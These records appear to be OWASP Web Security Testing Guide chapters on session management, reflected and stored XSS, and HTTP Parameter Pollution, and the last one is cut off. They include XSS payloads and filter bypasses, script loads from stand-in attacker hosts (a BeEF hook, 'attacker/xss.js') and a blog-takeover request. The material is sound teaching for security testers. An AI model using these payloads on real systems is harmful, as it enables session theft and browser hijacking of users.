{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/06-Session_Management_Testing/README.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/06-Session_Management_Testing/README.md", "content": "# 4.6 Session Management Testing\n\n4.6.1 [Testing for Session Management Schema](01-Testing_for_Session_Management_Schema.md)\n\n4.6.2 [Testing for Cookies Attributes](02-Testing_for_Cookies_Attributes.md)\n\n4.6.3 [Testing for Session Fixation](03-Testing_for_Session_Fixation.md)\n\n4.6.4 [Testing for Exposed Session Variables](04-Testing_for_Exposed_Session_Variables.md)\n\n4.6.5 [Testing for Cross Site Request Forgery](05-Testing_for_Cross_Site_Request_Forgery.md)\n\n4.6.6 [Testing for Logout Functionality](06-Testing_for_Logout_Functionality.md)\n\n4.6.7 [Testing Session Timeout](07-Testing_Session_Timeout.md)\n\n4.6.8 [Testing for Session Puzzling](08-Testing_for_Session_Puzzling.md)\n\n4.6.9 [Testing for Session Hijacking](09-Testing_for_Session_Hijacking.md)\n\n4.6.10 [Testing JSON Web Tokens](10-Testing_JSON_Web_Tokens.md)\n\n4.6.11 [Testing for Concurrent Sessions](11-Testing_for_Concurrent_Sessions.md)\n", "timestamp": "2025-10-24T11:39:50.661934"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting.md", "content": "# Testing for Reflected Cross Site Scripting\n\n|ID          |\n|------------|\n|WSTG-INPV-01|\n\n## Summary\n\nReflected [Cross-site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/) occur when an attacker injects browser executable code within a single HTTP response. The injected attack is not stored within the application itself; it is non-persistent and only impacts users who open a maliciously crafted link or third-party web page. The attack string is included as part of the crafted URI or HTTP parameters, improperly processed by the application, and returned to the victim.\n\nReflected XSS are the most frequent type of XSS attacks found in the wild. Reflected XSS attacks are also known as non-persistent XSS attacks and, since the attack payload is delivered and executed via a single request and response, they are also referred to as first-order or type 1 XSS.\n\nWhen a web application is vulnerable to this type of attack, it will pass unvalidated input sent through requests back to the client. The common modus operandi of the attack includes a design step, in which the attacker creates and tests an offending URI, a social engineering step, in which she convinces her victims to load this URI on their browsers, and the eventual execution of the offending code using the victim's browser.\n\nCommonly the attacker's code is written in the JavaScript language, but other scripting languages are also used, e.g., ActionScript and VBScript. Attackers typically leverage these vulnerabilities to install key loggers, steal victim cookies, perform clipboard theft, and change the content of the page (e.g., download links).\n\nOne of the primary difficulties in preventing XSS vulnerabilities is proper character encoding. In some cases, the web server or the web application could not be filtering some encodings of characters, so, for example, the web application might filter out `<script>`, but might not filter `%3cscript%3e` which simply includes another encoding of tags.\n\n## Test Objectives\n\n- Identify variables that are reflected in responses.\n- Assess the input they accept and the encoding that gets applied on return (if any).\n\n## How to Test\n\n### Black-Box Testing\n\nA black-box test will include at least three phases:\n\n#### Detect Input Vectors\n\nDetect input vectors. For each web page, the tester must determine all the web application's user-defined variables and how to input them. This includes hidden or non-obvious inputs such as HTTP parameters, POST data, hidden form field values, and predefined radio or selection values. Typically in-browser HTML editors or web proxies are used to view these hidden variables. See the example below.\n\n#### Analyze Input Vectors\n\nAnalyze each input vector to detect potential vulnerabilities. To detect an XSS vulnerability, the tester will typically use specially crafted input data with each input vector. Such input data is typically harmless, but trigger responses from the web browser that manifests the vulnerability. Testing data can be generated by using a web application fuzzer, an automated predefined list of known attack strings, or manually.\n  Some example of such input data are the following:\n\n- `<script>alert(123)</script>`\n- `\"><script>alert(document.cookie)</script>`\n\nFor a comprehensive list of potential test strings see the [XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet).\n\n#### Check Impact\n\nFor each test input attempted in the previous phase, the tester will analyze the result and determine if it represents a vulnerability that has a realistic impact on the web application's security. This requires examining the resulting web page HTML and searching for the test input. Once found, the tester identifies any special characters that were not properly encoded, replaced, or filtered out. The set of vulnerable unfiltered special characters will depend on the context of that section of HTML.\n\nIdeally all HTML special characters will be replaced with HTML entities. The key HTML entities to identify are:\n\n- `>` (greater than)\n- `<` (less than)\n- `&` (ampersand)\n- `'` (apostrophe or single quote)\n- `\"` (double quote)\n\nHowever, a full list of entities is defined by the HTML and XML specifications. [Wikipedia has a complete reference](https://en.wikipedia.org/wiki/List_of_XML_and_HTML_character_entity_references).\n\nWithin the context of an HTML action or JavaScript code, a different set of special characters will need to be escaped, encoded, replaced, or filtered out. These characters include:\n\n- `\\n` (new line)\n- `\\r` (carriage return)\n- `'` (apostrophe or single quote)\n- `\"` (double quote)\n- `\\` (backslash)\n- `\\uXXXX` (unicode values)\n\nFor a more complete reference, see the [Mozilla JavaScript guide](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Values,_variables,_and_literals#Using_special_characters_in_strings).\n\n#### Example 1\n\nFor example, consider a site that has a welcome notice `Welcome %username%` and a download link.\n\n![XSS Example 1](images/XSS_Example1.png)\\\n*Figure 4.7.1-1: XSS Example 1*\n\nThe tester must suspect that every data entry point can result in an XSS attack. To analyze it, the tester will play with the user variable and try to trigger the vulnerability.\n\nLet's try to click on the following link and see what happens:\n\n```text\nhttps://example.com/index.php?user=<script>alert(123)</script>\n```\n\nIf no sanitization is applied this will result in the following popup:\n\n![Alert](images/Alert.png)\\\n*Figure 4.7.1-2: XSS Example 1*\n\nThis indicates that there is an XSS vulnerability and it appears that the tester can execute code of his choice in anybody's browser if he clicks on the tester's link.\n\n#### Example 2\n\nLet's try other piece of code (link):\n\n```text\nhttps://example.com/index.php?user=<script>window.onload = function() {var AllLinks=document.getElementsByTagName(\"a\");AllLinks[0].href = \"https://badexample.com/malicious.exe\";}</script>\n```\n\nThis produces the following behavior:\n\n![XSS Example 2](images/XSS_Example2.png)\\\n*Figure 4.7.1-3: XSS Example 2*\n\nThis will cause the user, clicking on the link supplied by the tester, to download the file `malicious.exe` from a site they control.\n\n### Bypass XSS Filters\n\nReflected cross-site scripting attacks are prevented as the web application sanitizes input, a web application firewall blocks malicious input, or by mechanisms embedded in modern web browsers. The tester must test for vulnerabilities assuming that web browsers will not prevent the attack. Browsers may be out of date, or have built-in security features disabled. Similarly, web application firewalls are not guaranteed to recognize novel, unknown attacks. An attacker could craft an attack string that is unrecognized by the web application firewall.\n\nThus, the majority of XSS prevention must depend on the web application's sanitization of untrusted user input. There are several mechanisms available to developers for sanitization, such as returning an error, removing, encoding, or replacing invalid input. The means by which the application detects and corrects invalid input is another primary weakness in preventing XSS. A deny list may not include all possible attack strings, an allow list may be overly permissive, the sanitization could fail, or a type of input may be incorrectly trusted and remain unsanitized. All of these allow attackers to circumvent XSS filters.\n\nThe [XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet) documents common filter evasion tests.\n\n#### Example 3: Tag Attribute Value\n\nSince these filters are based on a deny list, they could not block every type of expressions. In fact, there are cases in which an XSS exploit can be carried out without the use of `<script>` tags and even without the use of characters such as `<` and `>` that are commonly filtered.\n\nFor example, the web application could use the user input value to fill an attribute, as shown in the following code:\n\n```html\n<input type=\"text\" name=\"state\" value=\"INPUT_FROM_USER\">\n```\n\nThen an attacker could submit the following code:\n\n```text\n\" onfocus=\"alert(document.cookie)\n```\n\n#### Example 4: Different Syntax or Encoding\n\nIn some cases it is possible that signature-based filters can be simply defeated by obfuscating the attack. Typically you can do this through the insertion of unexpected variations in the syntax or in the encoding. These variations are tolerated by browsers as valid HTML when the code is returned, and yet they could also be accepted by the filter.\n\nFollowing some examples:\n\n- `\"><script >alert(document.cookie)</script >`\n- `\"><ScRiPt>alert(document.cookie)</ScRiPt>`\n- `\"%3cscript%3ealert(document.cookie)%3c/script%3e`\n\n#### Example 5: Bypassing Non-Recursive Filtering\n\nSometimes the sanitization is applied only once and it is not being performed recursively. In this case the attacker can beat the filter by sending a string containing multiple attempts, like this one:\n\n```text\n<scr<script>ipt>alert(document.cookie)</script>\n```\n\n#### Example 6: Including External Script\n\nNow suppose that developers of the target site implemented the following code to protect the input from the inclusion of external script:\n\n```php\n<?\n    $re = \"/<script[^>]+src/i\";\n\n    if (preg_match($re, $_GET['var']))\n    {\n        echo \"Filtered\";\n        return;\n    }\n    echo \"Welcome \".$_GET['var'].\" !\";\n?>\n```\n\nDecoupling the above regular expression:\n\n1. Check for a `<script`\n2. Check for a \" \" (whitespace)\n3. Any character but the character `>` for one or more occurrences\n4. Check for a `src`\n\nThis is useful for filtering expressions like `<script src=\"https://attacker/xss.js\"></script>` which is a common attack. But, in this case, it is possible to bypass the sanitization by using the `>` character in an attribute between script and src, like this:\n\n```text\nhttps://example/?var=<SCRIPT%20a=\">\"%20SRC=\"https://attacker/xss.js\"></SCRIPT>\n```\n\nThis will exploit the reflected cross site scripting vulnerability shown before, executing the JavaScript code stored on the attacker's web server as if it was originating from the victim site, `https://example/`.\n\n#### Example 7: HTTP Parameter Pollution (HPP)\n\nAnother method to bypass filters is the HTTP Parameter Pollution, this technique was first presented by Stefano di Paola and Luca Carettoni in 2009 at the OWASP Poland conference. See the [Testing for HTTP Parameter pollution](04-Testing_for_HTTP_Parameter_Pollution.md) for more information. This evasion technique consists of splitting an attack vector between multiple parameters that have the same name. The manipulation of the value of each parameter depends on how each web technology is parsing these parameters, so this type of evasion is not always possible. If the tested environment concatenates the values of all parameters with the same name, then an attacker could use this technique in order to bypass pattern- based security mechanisms.\nRegular attack:\n\n```text\nhttps://example/page.php?param=<script>[...]</script>\n```\n\nAttack using HPP:\n\n```text\nhttps://example/page.php?param=<script&param=>[...]</&param=script>\n```\n\nSee the [XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet) for a more detailed list of filter evasion techniques. Finally, analyzing answers can get complex. A simple way to do this is to use code that pops up a dialog, as in our example. This typically indicates that an attacker could execute arbitrary JavaScript of his choice in the visitors' browsers.\n\n### Gray-Box Testing\n\nGray-box testing is similar to black-box testing. In gray-box testing, the pen-tester has partial knowledge of the application. In this case, information regarding user input, input validation controls, and how the user input is rendered back to the user might be known by the pen-tester.\n\nIf source code is available (white-box testing), all variables received from users should be analyzed. Moreover the tester should analyze any sanitization procedures implemented to decide if these can be circumvented.\n\n## Tools\n\n- [PHP Charset Encoder(PCE)](https://cybersecurity.wtf/encoder/) helps you encode arbitrary texts to and from 65 kinds of character sets that you can use in your customized payloads.\n- [Hackvertor](https://hackvertor.co.uk/public) is an online tool which allows many types of encoding and obfuscation of JavaScript (or any string input).\n- [XSS-Proxy](https://xss-proxy.sourceforge.net/) is an advanced Cross-Site-Scripting (XSS) attack tool.\n- [ratproxy](https://code.google.com/archive/p/ratproxy/) is a semi-automated, largely passive web application security audit tool, optimized for an accurate and sensitive detection, and automatic annotation, of potential problems and security-relevant design patterns based on the observation of existing, user-initiated traffic in complex web 2.0 environments.\n- [Burp Proxy](https://portswigger.net/burp/) is an interactive HTTP/S proxy server for attacking and testing web applications.\n- [Zed Attack Proxy (ZAP)](https://www.zaproxy.org) is an interactive HTTP/S proxy server for attacking and testing web applications with a built-in scanner.\n\n## References\n\n### OWASP Resources\n\n- [XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)\n\n### Books\n\n- Joel Scambray, Mike Shema, Caleb Sima - \"Hacking Exposed Web Applications\", Second Edition, McGraw-Hill, 2006 - ISBN 0-07-226229-0\n- Dafydd Stuttard, Marcus Pinto - \"The Web Application's Handbook - Discovering and Exploiting Security Flaws\", 2008, Wiley, ISBN 978-0-470-17077-9\n- Jeremiah Grossman, Robert \"RSnake\" Hansen, Petko \"pdp\" D. Petkov, Anton Rager, Seth Fogie - \"Cross Site Scripting Attacks: XSS Exploits and Defense\", 2007, Syngress, ISBN-10: 1-59749-154-3\n\n### Whitepapers\n\n- [CERT - Malicious HTML Tags Embedded in Client Web Requests](https://resources.sei.cmu.edu/asset_files/WhitePaper/2000_019_001_496188.pdf)\n- [cgisecurity.com - The Cross Site Scripting FAQ](https://www.cgisecurity.com/xss-faq.html)\n- [S. Frei, T. Dübendorfer, G. Ollmann, M. May - Understanding the Web browser threat](https://www.techzoom.net/Publications/Insecurity-Iceberg)\n", "timestamp": "2025-10-24T11:39:51.313652"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting.md", "content": "# Testing for Stored Cross Site Scripting\n\n|ID          |\n|------------|\n|WSTG-INPV-02|\n\n## Summary\n\nStored [Cross-site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/) is the most dangerous type of Cross Site Scripting. Web applications that allow users to store data are potentially exposed to this type of attack. This chapter illustrates examples of stored cross site scripting injection and related exploitation scenarios.\n\nStored XSS occurs when a web application gathers input from a user which might be malicious, and then stores that input in a data store for later use. The input that is stored is not correctly filtered. As a consequence, the malicious data will appear to be part of the site and run within the user’s browser under the privileges of the web application. Since this vulnerability typically involves at least two requests to the application, this may also called second-order XSS.\n\nThis vulnerability can be used to conduct a number of browser-based attacks including:\n\n- Hijacking another user's browser\n- Capturing sensitive information viewed by application users\n- Pseudo defacement of the application\n- Port scanning of internal hosts (\"internal\" in relation to the users of the web application)\n- Directed delivery of browser-based exploits\n- Other malicious activities\n\nStored XSS does not need a malicious link to be exploited. A successful exploitation occurs when a user visits a page with a stored XSS. The following phases relate to a typical stored XSS attack scenario:\n\n- Attacker stores malicious code into the vulnerable page\n- User authenticates in the application\n- User visits vulnerable page\n- Malicious code is executed by the user's browser\n\nThis type of attack can also be exploited with browser exploitation frameworks such as [BeEF](https://beefproject.com) and [XSS Proxy](https://xss-proxy.sourceforge.net/). These frameworks allow for complex JavaScript exploit development.\n\nStored XSS is particularly dangerous in application areas where users with high privileges have access. When the administrator visits the vulnerable page, the attack is automatically executed by their browser. This might expose sensitive information such as session authorization tokens.\n\n## Test Objectives\n\n- Identify stored input that is reflected on the client-side.\n- Assess the input they accept and the encoding that gets applied on return (if any).\n\n## How to Test\n\n### Black-Box Testing\n\nThe process for identifying stored XSS vulnerabilities is similar to the process described during the [testing for reflected XSS](01-Testing_for_Reflected_Cross_Site_Scripting.md).\n\n#### Input Forms\n\nThe first step is to identify all points where user input is stored into the backend and then displayed by the application. Typical examples of stored user input can be found in:\n\n- User/Profiles page: the application allows the user to edit/change profile details such as first name, last name, nickname, avatar, picture, address, etc.\n- Shopping cart: the application allows the user to store items into the shopping cart which can then be reviewed later\n- File Manager: application that allows upload of files\n- Application settings/preferences: application that allows the user to set preferences\n- Forum/Message board: application that permits exchange of posts among users\n- Blog: if the blog application permits to users submitting comments\n- Log: if the application stores some users input into logs.\n\n#### Analyze HTML Code\n\nInput stored by the application is normally used in HTML tags, but it can also be found as part of JavaScript content. At this stage, it is fundamental to understand if input is stored and how it is positioned in the context of the page. Differently from reflected XSS, the pen-tester should also investigate any out-of-band channels through which the application receives and stores users input.\n\n**Note**: All areas of the application accessible by administrators should be tested to identify the presence of any data submitted by users.\n\n**Example**: Email stored data in `index2.php`\n\n![Stored Input Example](images/Stored_input_example.jpg)\\\n*Figure 4.7.2-1: Stored Input Example*\n\nThe HTML code of index2.php where the email value is located:\n\n```html\n<input class=\"inputbox\" type=\"text\" name=\"email\" size=\"40\" value=\"aaa@aa.com\" />\n```\n\nIn this case, the tester needs to find a way to inject code outside the `<input>` tag as below:\n\n```html\n<input class=\"inputbox\" type=\"text\" name=\"email\" size=\"40\" value=\"aaa@aa.com\"> MALICIOUS CODE <!-- />\n```\n\n#### Testing for Stored XSS\n\nThis involves testing the input validation and filtering controls of the application. Basic injection examples in this case:\n\n- `aaa@aa.com&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;`\n- `aaa@aa.com%22%3E%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E`\n\nEnsure the input is submitted through the application. This normally involves disabling JavaScript if client-side security controls are implemented or modifying the HTTP request with a web proxy. It is also important to test the same injection with both HTTP GET and POST requests. The above injection results in a popup window containing the cookie values.\n\n> ![Stored XSS Example](images/Stored_xss_example.jpg)\\\n> *Figure 4.7.2-2: Stored Input Example*\n>\n> The HTML code following the injection:\n>\n> ```html\n> <input class=\"inputbox\" type=\"text\" name=\"email\" size=\"40\" value=\"aaa@aa.com\"><script>alert(document.cookie)</script>\n> ```\n>\n> The input is stored and the XSS payload is executed by the browser when reloading the page. If the input is escaped by the application, testers should test the application for XSS filters. For instance, if the string \"SCRIPT\" is replaced by a space or by a NULL character then this could be a potential sign of XSS filtering in action. Many techniques exist in order to evade input filters (see [testing for reflected XSS](01-Testing_for_Reflected_Cross_Site_Scripting.md)) chapter). It is strongly recommended that testers refer to [XSS Filter Evasion](https://owasp.org/www-community/xss-filter-evasion-cheatsheet) and [Mario](https://cybersecurity.wtf/encoder/) XSS Cheat pages, which provide an extensive list of XSS attacks and filtering bypasses. Refer to the whitepapers and tools section for more detailed information.\n\n#### Leverage Stored XSS with BeEF\n\nStored XSS can be exploited by advanced JavaScript exploitation frameworks such as [BeEF](https://www.beefproject.com) and [XSS Proxy](https://xss-proxy.sourceforge.net/).\n\nA typical BeEF exploitation scenario involves:\n\n- Injecting a JavaScript hook which communicates to the attacker's browser exploitation framework (BeEF)\n- Waiting for the application user to view the vulnerable page where the stored input is displayed\n- Control the application user’s browser via the BeEF console\n\nThe JavaScript hook can be injected by exploiting the XSS vulnerability in the web application.\n\n**Example**: BeEF Injection in `index2.php`:\n\n```html\naaa@aa.com\"><script src=https://attackersite/hook.js></script>\n```\n\nWhen the user loads the page `index2.php`, the script `hook.js` is executed by the browser. It is then possible to access cookies, user screenshot, user clipboard, and launch complex XSS attacks.\n\n> ![Beef Injection Example](images/RubyBeef.png)\\\n> *Figure 4.7.2-3: Beef Injection Example*\n>\n> This attack is particularly effective in vulnerable pages that are viewed by many users with different privileges.\n\n#### File Upload\n\nIf the web application allows file upload, it is important to check if it is possible to upload HTML content. For instance, if HTML or TXT files are allowed, XSS payload can be injected in the file uploaded. The pen-tester should also verify if the file upload allows setting arbitrary MIME types.\n\nConsider the following HTTP POST request for file upload:\n\n```http\nPOST /fileupload.aspx HTTP/1.1\n[…]\nContent-Disposition: form-data; name=\"uploadfile1\"; filename=\"C:\\Documents and Settings\\test\\Desktop\\test.txt\"\nContent-Type: text/plain\n\ntest\n```\n\nThis design flaw can be exploited in browser MIME mishandling attacks. For instance, innocuous-looking files like JPG and GIF can contain an XSS payload that is executed when they are loaded by the browser. This is possible when the MIME type for an image such as `image/gif` can instead be set to `text/html`. In this case the file will be treated by the client browser as HTML.\n\nHTTP POST Request forged:\n\n```html\nContent-Disposition: form-data; name=\"uploadfile1\"; filename=\"C:\\Documents and Settings\\test\\Desktop\\test.gif\"\nContent-Type: text/html\n\n<script>alert(document.cookie)</script>\n```\n\nAlso consider that Internet Explorer does not handle MIME types in the same way as Mozilla Firefox or other browsers do. For instance, Internet Explorer handles TXT files with HTML content as HTML content. For further information about MIME handling, refer to the whitepapers section at the bottom of this chapter.\n\n### Blind Cross-site Scripting\n\nBlind Cross-site Scripting is a form of stored XSS. It generally occurs when the attacker’s payload is saved on the server/infrastructure and later reflected back to the victim from the backend application. For example in feedback forms, an attacker can submit the malicious payload using the form, and once the backend user/admin of the application views the attacker’s submission via the backend application, the attacker’s payload will get executed. Blind Cross-site Scripting is hard to confirm in the real-world scenario but one of the best tools for this is [XSS Hunter](https://xsshunter.com/).\n\n> Note: Testers should carefully consider the privacy implications of using public or third party services while performing security tests. (See #tools.)\n\n### Gray-Box Testing\n\nGray-box testing is similar to black-box testing. In gray-box testing, the pen-tester has partial knowledge of the application. In this case, information regarding user input, input validation controls, and data storage might be known by the pen-tester.\n\nDepending on the information available, it is normally recommended that testers check how user input is processed by the application and then stored into the backend system. The following steps are recommended:\n\n- Use frontend application and enter input with special/invalid characters\n- Analyze application response(s)\n- Identify presence of input validation controls\n- Access backend system and check if input is stored and how it is stored\n- Analyze source code and understand how stored input is rendered by the application\n\nIf source code is available (as in white-box testing), all variables used in input forms should be analyzed. In particular, programming languages such as PHP, ASP, and JSP make use of predefined variables/functions to store input from HTTP GET and POST requests.\n\nThe following table summarizes some special variables and functions to look at when analyzing source code:\n\n| **PHP**        | **ASP**           |  **JSP**         |\n|----------------|-------------------|------------------|\n| `$_GET` - HTTP GET variables  | `Request.QueryString` - HTTP GET | `doGet`, `doPost` servlets - HTTP GET and POST |\n| `$_POST` - HTTP POST variables| `Request.Form` - HTTP POST | `request.getParameter` - HTTP GET/POST variables |\n| `$_REQUEST` – HTTP POST, GET and COOKIE variables | `Server.CreateObject` - used to upload files | |\n| `$_FILES` - HTTP File Upload variables | | |\n\n**Note**: The table above is only a summary of the most important parameters but, all user input parameters should be investigated.\n\n## Tools\n\n- [PHP Charset Encoder(PCE)](https://cybersecurity.wtf/encoder/) helps you encode arbitrary texts to and from 65 kinds of character sets that you can use in your customized payloads.\n- [Hackvertor](https://hackvertor.co.uk/public) is an online tool which allows many types of encoding and obfuscation of JavaScript (or any string input).\n- [BeEF](https://www.beefproject.com) is the browser exploitation framework. A professional tool to demonstrate the real-time impact of browser vulnerabilities.\n- [XSS-Proxy](https://xss-proxy.sourceforge.net/) is an advanced Cross-Site-Scripting (XSS) attack tool.\n- [Burp Proxy](https://portswigger.net/burp/) is an interactive HTTP/S proxy server for attacking and testing web applications.\n- [XSS Assistant](https://www.greasespot.net/) Greasemonkey script that allow users to easily test any web application for cross-site-scripting flaws.\n- [Zed Attack Proxy (ZAP)](https://www.zaproxy.org) is an interactive HTTP/S proxy server for attacking and testing web applications with a built-in scanner.\n- [XSS Hunter Portable](https://github.com/mandatoryprogrammer/xsshunter) XSS Hunter finds all kinds of cross-site scripting vulnerabilities, including the often-missed blind XSS.\n\n## References\n\n### OWASP Resources\n\n- [XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)\n\n### Books\n\n- Joel Scambray, Mike Shema, Caleb Sima - \"Hacking Exposed Web Applications\", Second Edition, McGraw-Hill, 2006 - ISBN 0-07-226229-0\n- Dafydd Stuttard, Marcus Pinto - \"The Web Application's Handbook - Discovering and Exploiting Security Flaws\", 2008, Wiley, ISBN 978-0-470-17077-9\n- Jeremiah Grossman, Robert \"RSnake\" Hansen, Petko \"pdp\" D. Petkov, Anton Rager, Seth Fogie - \"Cross Site Scripting Attacks: XSS Exploits and Defense\", 2007, Syngress, ISBN-10: 1-59749-154-3\n\n### Whitepapers\n\n- [CERT: \"CERT Advisory CA-2000-02 Malicious HTML Tags Embedded in Client Web Requests\"](https://resources.sei.cmu.edu/library/asset-view.cfm?assetID=496186)\n- [Amit Klein: \"Cross-site Scripting Explained\"](https://courses.csail.mit.edu/6.857/2009/handouts/css-explained.pdf)\n- [CGISecurity.com: \"The Cross Site Scripting FAQ\"](https://www.cgisecurity.com/xss-faq.html)\n", "timestamp": "2025-10-24T11:39:51.406288"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/03-Testing_for_HTTP_Verb_Tampering.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/03-Testing_for_HTTP_Verb_Tampering.md", "content": "# Testing for HTTP Verb Tampering\n\n|ID          |\n|------------|\n|WSTG-INPV-03|\n\nThis content has been merged into: [Test HTTP Methods](../02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods.md)\n", "timestamp": "2025-10-24T11:39:51.478317"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution.md", "content": "# Testing for HTTP Parameter Pollution\n\n|ID          |\n|------------|\n|WSTG-INPV-04|\n\n## Summary\n\nHTTP Parameter Pollution tests the applications response to receiving multiple HTTP parameters with the same name; for example, if the parameter `username` is included in the GET or POST parameters twice.\n\nSupplying multiple HTTP parameters with the same name may cause an application to interpret values in unanticipated ways. By exploiting these effects, an attacker may be able to bypass input validation, trigger application errors or modify internal variables values. As HTTP Parameter Pollution (in short *HPP*) affects a building block of all web technologies, server and client-side attacks exist.\n\nCurrent HTTP standards do not include guidance on how to interpret multiple input parameters with the same name. For instance, [RFC 3986](https://www.ietf.org/rfc/rfc3986.txt) simply defines the term *Query String* as a series of field-value pairs and [RFC 2396](https://www.ietf.org/rfc/rfc2396.txt) defines classes of reversed and unreserved query string characters. Without a standard in place, web application components handle this edge case in a variety of ways (see the table below for details).\n\nBy itself, this is not necessarily an indication of vulnerability. However, if the developer is not aware of the problem, the presence of duplicated parameters may produce an anomalous behavior in the application that can be potentially exploited by an attacker. As often in security, unexpected behaviors are a usual source of weaknesses that could lead to HTTP Parameter Pollution attacks in this case. To better introduce this class of vulnerabilities and the outcome of HPP attacks, it is interesting to analyze some real-life examples that have been discovered in the past.\n\n### Input Validation and Filters Bypass\n\nIn 2009, immediately after the publication of the first research on HTTP Parameter Pollution, the technique received attention from the security community as a possible way to bypass web application firewalls.\n\nOne of these flaws, affecting *ModSecurity SQL Injection Core Rules*, represents a perfect example of the impedance mismatch between applications and filters. The ModSecurity filter would correctly apply a deny list for the following string: `select 1,2,3 from table`, thus blocking this example URL from being processed by the web server: `/index.aspx?page=select 1,2,3 from table`. However, by exploiting the concatenation of multiple HTTP parameters, an attacker could cause the application server to concatenate the string after the ModSecurity filter already accepted the input. As an example, the URL `/index.aspx?page=select 1&page=2,3` from table would not trigger the ModSecurity filter, yet the application layer would concatenate the input back into the full malicious string.\n\nAnother HPP vulnerability turned out to affect *Apple Cups*, the well-known printing system used by many Unix systems. Exploiting HPP, an attacker could easily trigger a Cross-Site Scripting vulnerability using the following URL: `https://127.0.0.1:631/admin/?kerberos=onmouseover=alert(1)&kerberos`. The application validation checkpoint could be bypassed by adding an extra `kerberos` argument having a valid string (e.g. empty string). As the validation checkpoint would only consider the second occurrence, the first `kerberos` parameter was not properly sanitized before being used to generate dynamic HTML content. Successful exploitation would result in JavaScript code execution under the context of the hosting site.\n\n### Authentication Bypass\n\nAn even more critical HPP vulnerability was discovered in *Blogger*, the popular blogging platform. The bug allowed malicious users to take ownership of the victim’s blog by using the following HTTP request (`https://www.blogger.com/add-authors.do`):\n\n```html\nPOST /add-authors.do HTTP/1.1\n[...]\n\nsecurity_token=attackertoken&blogID=attackerblogidvalue&blogID=victimblogidvalue&authorsList=goldshlager19test%40gmail.com(attacker email)&ok=Invite\n```\n\nThe flaw resided in the authentication mechanism used by the web application, as the security check was performed on the first `blogID` parameter, whereas the actual operation used the second occurrence.\n\n### Expected Behavior by Application Server\n\nThe following table illustrates how different web technologies behave in presence of multiple occurrences of the same HTTP parameter.\n\nGiven the URL and querystring: `https://example.com/?color=red&color=blue`\n\n  | Web Application Server Backend | Parsing Result | Example |\n  |--------------------------------|----------------|--------|\n  | ASP.NET / IIS | All occurrences concatenated with a comma |  color=red,blue |\n  | ASP / IIS     | All occurrences concatenated with a comma | color=red,blue |\n  | .NET Core 3.1 / Kestrel | All occurrences concatenated with a comma | color=red,blue |\n  | .NET 5 / Kestrel | All occurrences concatenated with a comma | color=red,blue |\n  | PHP / Apache  | Last occurrence only | color=blue |\n  | PHP / Zeus | Last occurrence only | color=blue |\n  | JSP, Servlet / Apache Tomcat | First occurrence only | color=red |\n  | JSP, Servlet / Oracle Application Server 10g | First occurrence only | color=red |\n  | JSP, Servlet / Jetty  | First occurrence only | color=red |\n  | IBM Lotus Domino | Last occurrence only | color=blue |\n  | IBM HTTP Server | First occurrence only | color=red |\n  | Node.js / express | First occurrence only | color=red |\n  | mod_perl, libapreq2 / Apache | First occurrence only | color=red |\n  | Perl CGI / Apache | First occurrence only | color=red |\n  | mod_wsgi (Python) / Apache | First occurrence only | color=red |\n  | Python / Zope | All occurrences in List data type | color=['red','blue'] |\n\n(Source: Appsec EU 2009 Carettoni & Paola)\n\n## Test Objectives\n\n- Identify the backend and the parsing method used.\n- Assess injection points and try bypassing input filters using HPP.\n\n## How to Test\n\nLuckily, because the assignment of HTTP parameters is typically handled via the web application server, and not the application code itself, testing the response to parameter pollution should be standard across all pages and actions. However, as in-depth business logic knowledge is necessary, testing HPP requires manual testing. Automatic tools can only partially assist auditors as they tend to generate too many false positives. In addition, HPP can manifest itself in client-side and server-side components.\n\n### Server-Side HPP\n\nTo test for HPP vulnerabilities, identify any form or action that allows user-supplied input. Query string parameters in HTTP GET requests are easy to tweak in the navigation bar of the browser. If the form action submits data via POST, the tester will need to use an intercepting proxy to tamper with the POST data as it is sent to the server. Having identified a particular input parameter to test, one can edit the GET or POST data by intercepting the request, or change the query string after the response page loads. To test for HPP vulnerabilities simply append the same parameter to the GET or POST data but with a different value assigned.\n\nFor example: if testing the `search_string` parameter in the query string, the request URL would include that parameter name and value:\n\n```text\nhttps://example.com/?search_string=kittens\n```\n\nThe particular parameter might be hidden among several other parameters, but the approach is the same; leave the other parameters in place and append the duplicate:\n\n```text\nhttps://example.com/?mode=guest&search_string=kittens&num_results=100\n```\n\nAppend the same parameter with a different value:\n\n```text\nhttps://example.com/?mode=guest&search_string=kittens&num_results=100&search_string=puppies\n```\n\nand submit the new request.\n\nAnalyze the response page to determine which value(s) were parsed. In the above example, the search results may show `kittens`, `puppies`, some combination of 